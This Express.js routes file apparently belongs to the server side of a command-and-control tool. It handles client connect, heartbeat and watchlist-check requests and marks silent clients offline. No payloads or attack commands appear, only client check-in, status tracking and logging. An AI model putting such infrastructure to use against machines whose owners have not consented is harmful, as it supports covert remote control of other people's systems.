/**
 * General routes.
 */
"use strict";

const express = require("express");
const router  = express.Router();
const c2 = require("../src/c2.js");
const cli = require("../src/cli.js")
const bodyParser = require("body-parser");
const urlencodedParser = bodyParser.urlencoded({ extended: false });

let clients = {};

router.post('/check-watchlist', urlencodedParser, async (req, res) => {
    const clientInfo = await c2.getClientInfo()
    await cli.updateClientData(clientInfo);

    const isOnWatchlist = await cli.checkWatchlist(clientInfo);

    if (isOnWatchlist === false) {
      console.log(`Client: ${clientInfo.clientid} is not on watchlist`)
    }

    res.json({ onWatchlist: isOnWatchlist });
});


router.post('/connect', urlencodedParser, async (req, res) => {
    const { clientid } = req.body;
    const clientInfo = await c2.getClientInfo()

    clients[clientid] = { lastHeartbeat: Date.now() };
    console.log('Received client info:', clientInfo);

    await cli.updateClientOnline(clientInfo);
    c2.logToFile("Connected to server successfully", clientInfo.clientid);
    res.json({ message: 'Client connected successfully!' });
});

router.post('/heartbeat', urlencodedParser, async (req, res) => {
    const { clientid } = req.body;

    if (clients[clientid]) {
      clients[clientid].lastHeartbeat = Date.now();
    }

    const clientInfo = await c2.getClientInfo()
    console.log('Received client info:', clientInfo);

    await cli.updateClientData(clientInfo);
    await c2.logToFile("Heartbeat sent:", clientInfo.clientid);
    res.json({ message: 'Heartbeat received' });
});



async function checkForDisconnectedClients() {

    const currentTime = Date.now();
    
    for (const clientid in clients) {
      const lastHeartbeat = clients[clientid].lastHeartbeat;

      if (currentTime - lastHeartbeat > 10000) {
        await cli.updateClientOffline({clientid});
        console.log(`Client ${clientid} has been disconnected.`);

        await c2.logToFile("Logged out", clientid)
        delete clients[clientid];
      }
    }
  }
  

  setInterval(checkForDisconnectedClients, 2500);
  

module.exports = router;
